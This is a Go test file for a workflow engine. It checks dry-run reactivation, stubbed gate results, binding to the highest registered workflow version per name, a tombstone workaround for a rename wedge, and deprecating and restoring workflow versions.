// RE-activation on an already-`active` run must render `Run` as `active`
// (its real, current state) with `ProjectedStatus` equal to it too — so the
// operator sees "nothing about activation status would change" rather than a
// picture indistinguishable from a fresh activation.
func TestDryRunReactivationProjectsNoChange(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	issue := createIssue(t, conn, "first", "body", "task", nil)
	run := startRun(t, conn, issue)

	committedFirst, err := activate(conn, run.ID)
	testsupport.Must(t, err, "first activate: %v", err)
	firstActivatedAtMS := committedFirst.Run.ActivatedAtMS
	if firstActivatedAtMS == nil {
		t.Fatal("first activation left activated_at_ms nil")
	}

	result, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS + 1000, DryRun: true})
	testsupport.Must(t, err, "dry-run re-activation: %v", err)

	if !result.Reactivation {
		t.Error("dry-run re-activation did not report itself as a reactivation")
	}
	if result.Run.Status != model.RunActive {
		t.Errorf("Run.Status = %q, want %q (the run's real, current state)",
			result.Run.Status, model.RunActive)
	}
	if result.Run.ActivatedAtMS == nil || *result.Run.ActivatedAtMS != *firstActivatedAtMS {
		t.Errorf("Run.ActivatedAtMS = %v, want the original %d unchanged",
			result.Run.ActivatedAtMS, *firstActivatedAtMS)
	}
	if result.ProjectedStatus != model.RunActive {
		t.Errorf("ProjectedStatus = %q, want %q (re-activation changes nothing)",
			result.ProjectedStatus, model.RunActive)
	}
	if result.ProjectedActivatedAtMS == nil || *result.ProjectedActivatedAtMS != *firstActivatedAtMS {
		t.Errorf("ProjectedActivatedAtMS = %v, want the original %d — reactivation "+
			"never bumps it, dry-run or not", result.ProjectedActivatedAtMS, *firstActivatedAtMS)
	}
}

// ---------------------------------------------------------------------------
// §5.6 — the gate seam
// ---------------------------------------------------------------------------

// TestPassThroughRunnerStubsEveryGate pins both consequences §5.6 calls out:
// a gate that WOULD fail still passes at this stage, and `stub: true` appears
// in every result so an operator can tell a stubbed gate from a real one.
func TestPassThroughRunnerStubsEveryGate(t *testing.T) {
	var runner GateRunner = PassThroughRunner{}

	for _, spec := range []GateSpec{
		{Name: "build"},
		{Name: "checks", Source: "fence:checks", Commands: []string{"false"}},
		{Name: "acceptance", Source: "fence:acceptance", Pre: true},
	} {
		result, err := runner.Run(t.Context(), spec, StepContext{Instance: "implement@0"})
		testsupport.Must(t, err, "PassThroughRunner.Run(%q): %v", spec.Name, err)
		if result.Verdict != VerdictPass {
			t.Errorf("gate %q verdict = %q, want %q at this stage",
				spec.Name, result.Verdict, VerdictPass)
		}
		if result.Exit != 0 {
			t.Errorf("gate %q exit = %d, want 0", spec.Name, result.Exit)
		}
		// The load-bearing assertion: without `stub`, a green run at S3 is
		// indistinguishable from gate coverage it does not have.
		if !result.Stub {
			t.Errorf("gate %q result does not carry stub: true", spec.Name)
		}
		if result.Gate != spec.Name {
			t.Errorf("gate result names %q, want %q", result.Gate, spec.Name)
		}
		// It never touched the process table: argv stays empty because
		// nothing was resolved, let alone spawned.
		if len(result.Argv) != 0 {
			t.Errorf("gate %q result carries argv %v; the stub spawns nothing",
				spec.Name, result.Argv)
		}
	}
}

// TestGateStubIsInvisibleInJSONWhenAbsent pins the wire shape: `stub` is
// omitempty, so S4's real results — which set it false — emit §11.4's shape
// unchanged rather than a shape with a redundant `"stub": false`.
func TestGateStubIsInvisibleInJSONWhenAbsent(t *testing.T) {
	real, err := json.Marshal(GateResult{Gate: "build", Verdict: VerdictPass})
	testsupport.Must(t, err, "marshaling: %v", err)
	if strings.Contains(string(real), "stub") {
		t.Errorf("a non-stub gate result emits `stub`: %s", real)
	}

	stubbed, err := json.Marshal(GateResult{Gate: "build", Verdict: VerdictPass, Stub: true})
	testsupport.Must(t, err, "marshaling: %v", err)
	if !strings.Contains(string(stubbed), `"stub":true`) {
		t.Errorf("a stubbed gate result does not emit `stub: true`: %s", stubbed)
	}
}

// ---------------------------------------------------------------------------
// Bind-to-highest (engine-spec §11.1 as amended 2026-08-05)
// ---------------------------------------------------------------------------

// docsReviewSource is the M2a wedge's definition, parameterized by version.
// The name is kept verbatim from the toy run that found this: it bound a
// `docs-review` workflow, bumped it the way the retro loop does, and could not
// activate again.
func docsReviewSource(version int) []byte {
	return []byte(fmt.Sprintf(`
[pipeline]
name = "docs-review"
version = %d
[match]
kind = ["task"]
[[step]]
name = "review"
executor = "worker"
emits = "notes"
after = []
`, version))
}

// TestBindingUsesHighestVersionOfEachName is the M2a wedge as a regression
// test, verbatim: docs-review@1 and @2 registered, one issue, activation binds
// @2.
//
// Before the amendment this refused with "matches 2 workflows" — which made the
// version bump, the retro loop's entire output, unactivatable. The retro loop
// COMPLETING is what this test is really asserting.
//
// A second, unrelated name (docs-other, matching a different kind) is also
// registered so the reduction is exercised PER NAME, not just within the one
// name under test — TestBindingRefusesTwoDifferentNames covers the case where
// two names both survive to candidacy, but nothing else proves the highest-
// version reduction runs independently per name when more than one is
// registered.
//
// docs-other is registered at version 3, ABOVE docs-review's highest (@2), on
// purpose: a per-name reduction still elects docs-review@2 as docs-review's
// survivor regardless, but a global (non-per-name) reduction would instead
// elect docs-other@3 as the ONE overall survivor and drop docs-review
// entirely, turning this test's "binds @2" assertion into a refusal.
// Registering docs-other below docs-review's highest version (as a prior
// revision of this fixture did) cannot ever expose that defect, because a
// global reduction would then elect docs-review@2 regardless of whether the
// reduction is per-name or global — the two mechanisms are indistinguishable
// at that ordering. VERIFIED: this test fails under a mutant that reduces
// bindableDefinitions globally (a constant key instead of
// d.workflow.Name) and passes on unmutated code.
func TestBindingUsesHighestVersionOfEachName(t *testing.T) {
	conn := mustDB(t)
	registerSource(t, conn, docsReviewSource(1), "docs-review-v1.toml")
	v2 := registerSource(t, conn, docsReviewSource(2), "docs-review-v2.toml")
	registerSource(t, conn, []byte(`
[pipeline]
name = "docs-other"
version = 3
[match]
kind = ["bug"]
[[step]]
name = "review"
executor = "worker"
emits = "notes"
after = []
`), "docs-other-v3.toml")

	issue := createIssue(t, conn, "review the docs", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate refused a name registered at two versions: %v", err)
	if result.IssuesBound != 1 {
		t.Errorf("bound %d issues, want 1", result.IssuesBound)
	}

	runIssues, err := db.ListRunIssues(conn, run.ID)
	testsupport.Must(t, err, "listing run issues: %v", err)
	if runIssues[0].WorkflowID == nil || *runIssues[0].WorkflowID != v2.ID {
		t.Fatalf("bound workflow id = %v, want %d (docs-review@2)",
			runIssues[0].WorkflowID, v2.ID)
	}

	// The pin follows the binding: a run that bound @2 must be pinned to @2,
	// or the next activation would resolve a version it never bound.
	pins, err := db.ListPins(conn, run.ID)
	testsupport.Must(t, err, "listing pins: %v", err)
	var pinned string
	for _, p := range pins {
		if p.Kind == db.PinKindWorkflow {
			pinned = p.Ref
		}
	}
	if pinned != "docs-review@2" {
		t.Errorf("workflow pin = %q, want docs-review@2", pinned)
	}
}

// TestBindingRefusesTwoDifferentNames: reducing to the highest version per name
// narrows the candidate set WITHIN a name and nothing else. Two DIFFERENT names
// matching one issue is still the ambiguity core refuses rather than resolves,
// and the error still names BOTH — picking one would be an opinion about which
// pipeline an operator meant.
func TestBindingRefusesTwoDifferentNames(t *testing.T) {
	conn := mustDB(t)

	// Each name registered twice, so the reduction is exercised on both sides:
	// what survives is alpha@2 and beta@2, and two names still refuse.
	for _, v := range []int{1, 2} {
		registerSource(t, conn, []byte(fmt.Sprintf(`
[pipeline]
name = "alpha"
version = %d
[match]
kind = ["task"]
[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`, v)), fmt.Sprintf("alpha-v%d.toml", v))
		registerSource(t, conn, []byte(fmt.Sprintf(`
[pipeline]
name = "beta"
version = %d
[match]
kind = ["task"]
[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`, v)), fmt.Sprintf("beta-v%d.toml", v))
	}

	issue := createIssue(t, conn, "ambiguous", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded on an issue two workflow NAMES match")
	}
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}

	msg := err.Error()
	if !strings.Contains(msg, model.FormatID(issue)) {
		t.Errorf("error does not name the issue: %s", msg)
	}
	for _, ref := range []string{"alpha@2", "beta@2"} {
		if !strings.Contains(msg, ref) {
			t.Errorf("error does not name candidate %s: %s", ref, msg)
		}
	}
	// The superseded versions are NOT named: an error listing them would send an
	// operator to edit a definition that could not have bound the issue anyway.
	//
	// This negative assertion does NOT discriminate the branch on its own —
	// refList omits alpha@1/beta@1 in the zero-match branch too, so the whole
	// block above holds on either refusal. The discriminator
	// below is what makes this test mean what its name says.
	for _, ref := range []string{"alpha@1", "beta@1"} {
		if strings.Contains(msg, ref) {
			t.Errorf("error names superseded candidate %s, which never binds: %s", ref, msg)
		}
	}
	assertMultiMatchBranch(t, err)

	assertNothingWritten(t, conn)
}

// TestBindingAgreesWithWorkflowShowResolution is the ONE helper the amendment's
// "mirroring `workflow show`'s resolution" clause turns into an assertion.
//
// Binding and `workflow show NAME` disagreeing about what "the" workflow of a
// name is was the DEFECT: show resolved docs-review to @2 while
// binding treated @1 and @2 as two candidates and refused. Asserting the two
// resolutions agree — rather than asserting each separately against a literal —
// is what keeps them from drifting apart again, since a change to either side
// alone fails here.
func TestBindingAgreesWithWorkflowShowResolution(t *testing.T) {
	conn := mustDB(t)

	// Registered out of version order, so neither resolution can pass by
	// accident of insertion order.
	registerSource(t, conn, docsReviewSource(2), "docs-review-v2.toml")
	registerSource(t, conn, docsReviewSource(1), "docs-review-v1.toml")
	registerSource(t, conn, docsReviewSource(3), "docs-review-v3.toml")

	// `workflow show NAME` without @version: db.GetWorkflow with version 0.
	shown, err := db.GetWorkflow(conn, 1, "docs-review", 0)
	testsupport.Must(t, err, "resolving docs-review the way `workflow show` does: %v", err)

	// Binding's resolution, through the same reduction activation uses.
	definitions, err := loadDefinitions(conn, 1)
	testsupport.Must(t, err, "loading definitions: %v", err)
	candidates := bindableDefinitions(definitions)

	var bound *boundDefinition
	for _, d := range candidates {
		if d.workflow.Name == "docs-review" {
			if bound != nil {
				t.Fatalf("binding kept %s AND %s as candidates for one name",
					bound.workflow.Ref(), d.workflow.Ref())
			}
			bound = d
		}
	}
	if bound == nil {
		t.Fatal("binding kept no candidate for docs-review")
	}

	if bound.workflow.Ref() != shown.Ref() {
		t.Errorf("binding resolves docs-review to %s but `workflow show` resolves it to %s; "+
			"§11.1 requires they agree", bound.workflow.Ref(), shown.Ref())
	}

	// Superseded versions REMAIN REGISTERED — they stop binding, they do not
	// disappear. The runs that pinned them resolve them by id, and an operator
	// can still ask for them by explicit @version.
	if len(definitions) != 3 {
		t.Errorf("loadDefinitions returned %d rows, want 3: superseded versions "+
			"must stay registered for the runs that pinned them", len(definitions))
	}
	for _, v := range []int{1, 2} {
		if _, err := db.GetWorkflow(conn, 1, "docs-review", v); err != nil {
			t.Errorf("superseded docs-review@%d is no longer resolvable: %v", v, err)
		}
	}
}

// ---------------------------------------------------------------------------
// Registration lifetime under deletion and rename (AC-D2/AC-D3)
// ---------------------------------------------------------------------------

// goneWorkflowSrc is an auto-registered workflow that matches `task` issues,
// used by the deletion, rename-plus-bump and tombstone characterizations
// below.
const goneWorkflowSrc = `
[pipeline]
name = "gone"
version = 1

[match]
kind = ["task"]

[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`

// goneRenamedWorkflowSrc is the "gone" name's rename-plus-bump target, shared
// by TestRenamePlusBumpRefusesActivation (written into the config directory,
// the actual rename sequence) and TestTombstoneRetiresAWedgedName (registered
// directly via registerSource, to build the same wedge without re-deriving
// the deletion this file's other test already covers).
const goneRenamedWorkflowSrc = `
[pipeline]
name = "gone-renamed"
version = 2

[match]
kind = ["task"]

[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`

// TestRegistrationSurvivesTOMLDeletion is AC-D2: a workflow's TOML is
// removed from the config directory AFTER activation registered it, and a
// second activation still binds to it. `loadDefinitions` reads the
// `workflows` table, never the filesystem, so a registration is a row, not a
// file — deleting the file cannot retire the name.
//
// This is a CHARACTERIZATION test: it pins today's registration lifetime. It
// does not claim this is safe in general — a config file a run's PACKET
// declares does NOT survive deletion (readPinnedPacketFile fails NOT_FOUND);
// this test is scoped to workflow registration specifically, one layer over.
//
// The assertion that makes this non-vacuous: the SECOND activation registers
// NOTHING (the file is genuinely gone from the scan) and STILL binds. A test
// that only asserted "it bound" would pass identically whether or not the file
// was actually deleted.
func TestRegistrationSurvivesTOMLDeletion(t *testing.T) {
	conn, configDir := configRepo(t)
	path := writeConfigFile(t, configDir, "workflows/gone.toml", goneWorkflowSrc)

	first := createIssue(t, conn, "first", "body", "task", nil)
	firstRun := startRun(t, conn, first)
	result, err := activate(conn, firstRun.ID)
	testsupport.Must(t, err, "the first activation: %v", err)
	if len(result.Registered) != 1 || result.Registered[0].Name != "gone" ||
		result.Registered[0].Version != 1 || result.Registered[0].Outcome != RegistrationNew {
		t.Fatalf("the first activation registered %+v, want exactly one row: "+
			"gone@1, outcome %q", result.Registered, RegistrationNew)
	}

	err = os.Remove(path)
	testsupport.Must(t, err, "deleting the registered TOML: %v", err)

	second := createIssue(t, conn, "second", "body", "task", nil)
	secondRun := startRun(t, conn, second)
	result, err = activate(conn, secondRun.ID)
	testsupport.Must(t, err, "the second activation, over a deleted-TOML registration: %v", err)
	if len(result.Registered) != 0 {
		t.Errorf("the second activation registered %d files after the TOML "+
			"was deleted; the scan must find nothing", len(result.Registered))
	}
	if result.IssuesBound != 1 {
		t.Errorf("bound %d issues, want 1: the deleted registration must "+
			"still bind", result.IssuesBound)
	}

	pins, err := db.ListPins(conn, secondRun.ID)
	testsupport.Must(t, err, "listing pins: %v", err)
	var pinned string
	workflowPins := 0
	for _, p := range pins {
		if p.Kind == db.PinKindWorkflow {
			pinned = p.Ref
			workflowPins++
		}
	}
	if workflowPins != 1 {
		t.Fatalf("run has %d workflow pins, want exactly 1", workflowPins)
	}
	if pinned != "gone@1" {
		t.Errorf("workflow pin = %q, want gone@1 (the deleted-file "+
			"registration, still the only candidate)", pinned)
	}
}

// TestRenamePlusBumpRefusesActivation is AC-D3: a workflow
// originally registered as "gone" is DELETED and re-authored under a NEW name
// ("gone-renamed") at a higher version — the actual rename-plus-bump
// sequence, arranged through the config-directory scan exactly as AC-D2
// above, not merely two independently-registered names side by side.
// Registering the new name does not retire the old one, because the dedup
// key is `[pipeline].name`, which `bindableDefinitions` groups on, and
// nothing ever removes a row. An issue that both names' `[match]` admit
// therefore sees two DIFFERENT names as candidates, which is the ambiguity
// `bindIssue` refuses rather than resolves.
//
// This is a CHARACTERIZATION test: it pins the refusal as it exists today. It
// does not assert the refusal is correct — a future retire verb is expected to
// change this outcome deliberately (re-scoped per this issue's AC-D4
// verdict to the lifecycle-verbs issue that owns that verb), and the literal
// candidate list below is what makes that change a visible, intentional edit
// rather than a silent one.
func TestRenamePlusBumpRefusesActivation(t *testing.T) {
	conn, configDir := configRepo(t)
	path := writeConfigFile(t, configDir, "workflows/gone.toml", goneWorkflowSrc)

	first := createIssue(t, conn, "first", "body", "task", nil)
	firstRun := startRun(t, conn, first)
	_, err := activate(conn, firstRun.ID)
	testsupport.Must(t, err, "registering gone@1 through the first activation: %v", err)

	// DELETE the original, then RE-AUTHOR under a new name at a higher
	// version: the rename.
	err = os.Remove(path)
	testsupport.Must(t, err, "deleting gone.toml before the rename: %v", err)
	writeConfigFile(t, configDir, "workflows/gone-renamed.toml", goneRenamedWorkflowSrc)

	issue := createIssue(t, conn, "rename plus bump", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err = activate(conn, run.ID)
	if err == nil {
		t.Fatal("activation succeeded on an issue two workflow NAMES match " +
			"after a rename-plus-bump; today's binding refuses this")
	}
	assertRenamePlusBumpWedge(t, err, issue)

	// Scoped to this run: the earlier activation that registered gone@1 wrote
	// its own steps, pins and binding on this same connection.
	assertNothingWrittenForRun(t, conn, run.ID)

	// The refused activation's own registration — gone-renamed@2 — must not
	// have committed either: assertNothingWrittenForRun covers steps, pins,
	// run_fences and run_issues, but `workflows` has no run_id to scope by,
	// so the rollback of the NEW registration needs its own check.
	if _, err := db.GetWorkflow(conn, 1, "gone-renamed", 2); !errors.Is(err, db.ErrWorkflowNotFound) {
		t.Errorf("gone-renamed@2 is resolvable after its registration refused: "+
			"err = %v, want %v", err, db.ErrWorkflowNotFound)
	}
}

// assertRenamePlusBumpWedge asserts that err is the exact rename-plus-bump
// wedge refusal: CodeValidation, naming the issue and the candidates
// "gone@1, gone-renamed@2" (name-ascending, per loadDefinitions' sort at
// activate.go:610-615). Shared by TestRenamePlusBumpRefusesActivation and
// TestTombstoneRetiresAWedgedName's setup, so the tombstone test's
// precondition is pinned as precisely as the refusal it retires — a zero-match
// refusal or an unrelated error would satisfy a bare "err != nil" check just
// as readily, and would leave the tombstone test's premise silently wrong.
func assertRenamePlusBumpWedge(t *testing.T, err error, issue int) {
	t.Helper()
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}

	msg := err.Error()
	if !strings.Contains(msg, model.FormatID(issue)) {
		t.Errorf("error does not name the issue: %s", msg)
	}
	// Name-ascending, matching loadDefinitions' sort: "gone" before
	// "gone-renamed".
	const wantCandidates = "gone@1, gone-renamed@2"
	if !strings.Contains(msg, wantCandidates) {
		t.Errorf("error does not name the candidates as %q: %s", wantCandidates, msg)
	}
	assertMultiMatchBranch(t, err)
}

// multiMatchDiscriminator is the ONLY text distinguishing bindIssue's two
// refusal branches (activate.go:762-767 versus :756-761).
//
// Everything else about them is identical to an assertion: both go through
// validationErr, both carry CodeValidation, both name the issue via
// model.FormatID, and both render their candidate slice through refList in the
// same name-ascending order. So a test that checks only the code, the issue,
// and the candidate list pins "refused" — not "refused because two different
// names matched".
const multiMatchDiscriminator = "exactly one must match"

// zeroMatchDiscriminator is the corresponding literal on the zero-match branch
// (activate.go:757-759). Asserting its ABSENCE is what makes the multi-match
// assertion two-sided: the wrong branch is rejected, not merely unmentioned.
const zeroMatchDiscriminator = "matches no registered workflow"

// assertMultiMatchBranch requires err to be the MULTI-match refusal, and not
// the zero-match one.
//
// Both directions are asserted deliberately. Requiring the multi-match literal
// alone would still pass a hypothetical message that emitted both, and the
// whole lesson here is that "the assertion held" and "the assertion
// discriminated" are different claims.
func assertMultiMatchBranch(t *testing.T, err error) {
	t.Helper()
	msg := err.Error()
	if !strings.Contains(msg, multiMatchDiscriminator) {
		t.Errorf("error does not carry the multi-match discriminator %q, so it "+
			"does not distinguish a two-names refusal from a zero-match one: %s",
			multiMatchDiscriminator, msg)
	}
	if strings.Contains(msg, zeroMatchDiscriminator) {
		t.Errorf("error carries the ZERO-match text %q; this assertion means "+
			"two different names matched: %s", zeroMatchDiscriminator, msg)
	}
}

// TestTombstoneRetiresAWedgedName pins the only currently-known escape from
// the rename-plus-bump wedge above (threat model AC-4's C-3): re-registering
// the OLD name at a HIGHER version whose `[match]` matches nothing retires it
// from binding, because `bindableDefinitions` reduces to the highest version
// per name BEFORE `[match]` is evaluated — a non-matching highest version
// removes the WHOLE name from the candidate set. Without this test, a
// refactor that moved the reduction after the match loop would remove the
// operator's only supported recovery from a wedge, and the rest of this
// file's suite would stay green.
//
// This is a CHARACTERIZATION test, exactly like its sibling above: the retire
// verb (re-scoped per this issue's AC-D4 verdict) is expected to add
// a real retirement primitive, at which point this test's tombstone recipe
// stops being the only escape and this test's assertions may need to change
// deliberately.
//
// Arranged through mustDB/registerSource rather than configRepo/
// writeConfigFile (the seam TestRenamePlusBumpRefusesActivation above uses):
// a tombstone is what `docket workflow register` writes today, not a
// config-tree file drop, so registering it directly is the more honest
// arrangement for what this test is actually pinning.
func TestTombstoneRetiresAWedgedName(t *testing.T) {
	conn := mustDB(t)

	registerSource(t, conn, []byte(goneWorkflowSrc), "gone.toml")
	registerSource(t, conn, []byte(goneRenamedWorkflowSrc), "gone-renamed.toml")

	wedged := createIssue(t, conn, "wedged before the tombstone", "a body", "task", nil)
	wedgedRun := startRun(t, conn, wedged)
	_, err := activate(conn, wedgedRun.ID)
	if err == nil {
		t.Fatal("setup: expected the rename-plus-bump wedge to refuse before " +
			"the tombstone is registered")
	}
	assertRenamePlusBumpWedge(t, err, wedged)

	// The tombstone: re-register "gone" at a HIGHER version with a [match]
	// that admits NOTHING, by construction rather than by picking an issue
	// kind that merely seems unlikely. `labels_all = ["retired"]` combined
	// with `unless_labels = ["retired"]` is contradictory for every possible
	// Subject (match.go:48-58): if the issue carries "retired", the
	// unless_labels exclusion fires; if it does not, the labels_all
	// requirement fails. A kind-based recipe (e.g. `kind = ["epic"]`) is NOT
	// inert — it captures every epic issue in the repo and re-creates the
	// exact two-names wedge this test is retiring, verified by activating an
	// epic issue against it separately.
	registerSource(t, conn, []byte(`
[pipeline]
name = "gone"
version = 99

[match]
labels_all = ["retired"]
unless_labels = ["retired"]

[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`), "gone-tombstone.toml")

	issue := createIssue(t, conn, "after the tombstone", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "the tombstone did not retire \"gone\" from binding: %v", err)
	if result.IssuesBound != 1 {
		t.Errorf("bound %d issues, want 1", result.IssuesBound)
	}

	pins, err := db.ListPins(conn, run.ID)
	testsupport.Must(t, err, "listing pins: %v", err)
	var pinned string
	workflowPins := 0
	for _, p := range pins {
		if p.Kind == db.PinKindWorkflow {
			pinned = p.Ref
			workflowPins++
		}
	}
	if workflowPins != 1 {
		t.Fatalf("run has %d workflow pins, want exactly 1", workflowPins)
	}
	if pinned != "gone-renamed@2" {
		t.Errorf("workflow pin = %q, want gone-renamed@2 (the surviving name, "+
			"after the tombstone retired \"gone\")", pinned)
	}
}

// probeWorkflowSrc builds a minimal task-matching workflow at name@version.
func probeWorkflowSrc(name string, version int) []byte {
	return fmt.Appendf(nil, `
[pipeline]
name = "%s"
version = %d
[match]
kind = ["task"]
[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`, name, version)
}

// pinnedWorkflowRef returns the `name@version` a run pinned at activation.
func pinnedWorkflowRef(t *testing.T, conn *sql.DB, runID int) string {
	t.Helper()
	pins, err := db.ListPins(conn, runID)
	testsupport.Must(t, err, "listing pins: %v", err)
	for _, p := range pins {
		if p.Kind == db.PinKindWorkflow {
			return p.Ref
		}
	}
	return ""
}

// deprecate retires one registered version, failing the test if it cannot.
func deprecate(t *testing.T, conn *sql.DB, name string, version int) {
	t.Helper()
	_, err := db.DeprecateWorkflow(conn, 1, name, version, nowMS)
	testsupport.Must(t, err, "deprecating %s@%d: %v", name, version, err)
}

// TestDeprecationRetiresANameFromBinding is AC-D1, at the seam that
// decides it.
//
// The rename-plus-bump wedge is the defect: two names match one issue,
// activation refuses, and no edit to either `[match]` resolves it because the
// OLD name is what matches — deleting its TOML does not unregister it. Retiring
// every version of the old name is the supported way out, and this asserts the
// refusal turns into a clean single binding.
func TestDeprecationRetiresANameFromBinding(t *testing.T) {
	conn := mustDB(t)

	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
	registerSource(t, conn, probeWorkflowSrc("probe", 2), "probe-v2.toml")
	registerSource(t, conn, probeWorkflowSrc("probe-renamed", 2), "renamed.toml")

	issue := createIssue(t, conn, "wedged", "a body", "task", nil)

	// Premise: the wedge is real, and it is the MULTI-match branch.
	run := startRun(t, conn, issue)
	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("premise: expected the rename-plus-bump wedge to refuse")
	}
	assertMultiMatchBranch(t, err)

	// Retire BOTH versions of the old name. Retiring only the highest would
	// leave @1 binding, which is the fallback behaviour asserted separately.
	deprecate(t, conn, "probe", 1)
	deprecate(t, conn, "probe", 2)

	run2 := startRun(t, conn, issue)
	_, err = activate(conn, run2.ID)
	testsupport.Must(t, err, "activation still refuses after the old name was retired: %v", err)
}

// TestDeprecationFallsBackToTheNextBindingVersion pins the ORDER of the two
// filters, which is the whole design of bindableDefinitions.
//
// Retirement is applied BEFORE the highest-version reduction, so retiring the
// top version falls back to the one beneath it. Applying it afterwards would
// give the opposite: @2 would win the reduction, then be dropped, and the name
// would stop binding even though @1 is registered and perfectly able to.
func TestDeprecationFallsBackToTheNextBindingVersion(t *testing.T) {
	conn := mustDB(t)

	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
	registerSource(t, conn, probeWorkflowSrc("probe", 2), "probe-v2.toml")
	deprecate(t, conn, "probe", 2)

	issue := createIssue(t, conn, "falls back", "a body", "task", nil)
	run := startRun(t, conn, issue)
	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "retiring @2 left the name unroutable even though @1 binds: %v", err)

	pinned := pinnedWorkflowRef(t, conn, run.ID)
	if pinned != "probe@1" {
		t.Errorf("pinned %q, want probe@1 — binding must fall back to the "+
			"highest version that is NOT retired", pinned)
	}
}

// TestDeprecationKeepsPinnedRunsResolvable is AC-D2: retirement is a
// binding-time filter, not a retraction.
//
// A run that pinned a definition before it was retired must keep resolving it.
// Any change that broke definitionByID for an in-flight run would turn a
// routing decision into a retroactive one.
func TestDeprecationKeepsPinnedRunsResolvable(t *testing.T) {
	conn := mustDB(t)

	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
	issue := createIssue(t, conn, "in flight", "a body", "task", nil)
	run := startRun(t, conn, issue)
	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "premise activation: %v", err)

	deprecate(t, conn, "probe", 1)

	// The pin still resolves, by ID, to the retired definition.
	if pinned := pinnedWorkflowRef(t, conn, run.ID); pinned != "probe@1" {
		t.Errorf("pinned workflow reads %q after retirement, want probe@1", pinned)
	}
	// And the row is still readable by explicit version — retirement never
	// deletes.
	wf, err := db.GetWorkflow(conn, 1, "probe", 1)
	testsupport.Must(t, err, "retired version is no longer readable by @version: %v", err)
	if !wf.Deprecated() {
		t.Error("the row does not report itself as deprecated")
	}
	if wf.Body == "" {
		t.Error("the retired row lost its body; retirement must not delete content")
	}
}

// TestDeprecatingEveryVersionSaysSoInTheError covers the whole-name case the
// issue required a decision on. "Nothing is registered" and "everything
// registered is retired" are different repo states that send an operator to
// different remedies, so they must not share a message.
func TestDeprecatingEveryVersionSaysSoInTheError(t *testing.T) {
	conn := mustDB(t)

	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
	deprecate(t, conn, "probe", 1)

	issue := createIssue(t, conn, "nothing binds", "a body", "task", nil)
	run := startRun(t, conn, issue)
	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("activation succeeded with every registered version retired")
	}
	msg := err.Error()
	if !strings.Contains(msg, "deprecated") {
		t.Errorf("error does not say the versions are deprecated: %s", msg)
	}
	if strings.Contains(msg, "none is registered") {
		t.Errorf("error claims nothing is registered when a retired version "+
			"exists, which sends the operator to the wrong remedy: %s", msg)
	}
}

// TestRestoreReturnsAVersionToBinding: retirement is reversible, and the
// reversal is observable at the binding seam rather than only in the row.
func TestRestoreReturnsAVersionToBinding(t *testing.T) {
	conn := mustDB(t)

	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
	deprecate(t, conn, "probe", 1)

	_, err := db.RestoreWorkflow(conn, 1, "probe", 1)
	testsupport.Must(t, err, "RestoreWorkflow: %v", err)

	issue := createIssue(t, conn, "restored", "a body", "task", nil)
	run := startRun(t, conn, issue)
	_, err = activate(conn, run.ID)
	testsupport.Must(t, err, "activation still refuses after restore: %v", err)
}
